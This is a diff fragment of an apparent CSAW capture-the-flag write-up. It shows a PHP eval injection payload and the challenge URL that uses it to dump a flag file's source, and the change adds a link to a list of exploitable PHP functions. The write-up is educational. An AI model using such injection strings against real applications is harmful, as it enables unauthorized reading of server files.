@@ -10,4 +10,4 @@ So, using the page string as `' and die(show_source('templates/flag.php')) or '`
 
 BTW, the URL to run that page was `http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27`
 
-Fun challenge overall :) Goes on to show that one should NEVER let user input be `eval`d in any way.
+Fun challenge overall :) Goes on to show that one should NEVER let user input be `eval`d in any way. [This stackoverflow answer](https://stackoverflow.com/questions/3115559/exploitable-php-functions) has a nice list of all the executable pathways in PHP.
